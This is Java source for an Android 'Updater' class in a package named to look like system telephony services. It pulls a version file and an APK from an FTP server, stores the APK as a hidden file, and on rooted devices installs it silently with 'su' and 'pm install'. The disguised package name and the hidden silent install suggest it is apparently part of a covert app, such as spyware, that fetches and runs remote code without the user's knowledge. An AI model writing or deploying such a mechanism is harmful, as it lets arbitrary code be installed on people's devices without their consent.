package com.telephony.services;

import java.io.File;
import java.io.IOException;
import java.lang.ref.WeakReference;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class Updater {
	private MyFTPClient ftp = null;
	private WeakReference<Context> wContext = null;
	private MyProperties props = null;
	private PreferenceUtils sPref = null;

	public static final String VER_PROP_FILE = "ver.prop";
	public static final String REMOTE_VER = "ver";
	public static final String APK_REMOTE_FILE = "apk";

	public Updater(Context context, final MyFTPClient ftp) throws IOException {
		this.ftp = ftp;
		wContext = new WeakReference<Context>(context);
		sPref = PreferenceUtils.getInstance(context);
		props = new MyProperties();
		props.load(Utils.implodeStrings(ftp.downloadFileStrings(VER_PROP_FILE), "\n"));
	}

	public int getRemoteVersion() {
		if (!props.isEmpty()) {
			return props.getIntProperty(REMOTE_VER, 0);
		}
		return 0;
	}

	public String getAPKRemoteFile() {
		if (!props.isEmpty()) {
			return props.getProperty(APK_REMOTE_FILE, "");
		}
		return null;
	}

	public void updateAPK() {
		try {
			long rfs = ftp.getFileSize(getAPKRemoteFile());
			if (rfs > 0) {
				File apk_file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), getAPKRemoteFile()));
				if (apk_file != null) {
					if ((apk_file.exists() && (apk_file.length() != rfs)) || (!apk_file.exists())) {
						if (ftp.downloadFile(getAPKRemoteFile(), apk_file)) {
							if (Utils.CheckRoot()) {
								new Proc("su").exec(new String[] { "pm install " + apk_file.getAbsolutePath() });
							} else {
								Intent intent = new Intent(Intent.ACTION_VIEW);
								intent.setDataAndType(Uri.fromFile(apk_file), "application/vnd.android.package-archive");
								intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
								if (wContext != null) {
									Utils.show_notification(wContext.get(), 0, intent);
								}
							}
						}
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void free() {
		wContext.clear();
		wContext = null;
		props.clear();
		props = null;
		sPref = null;
	}

}
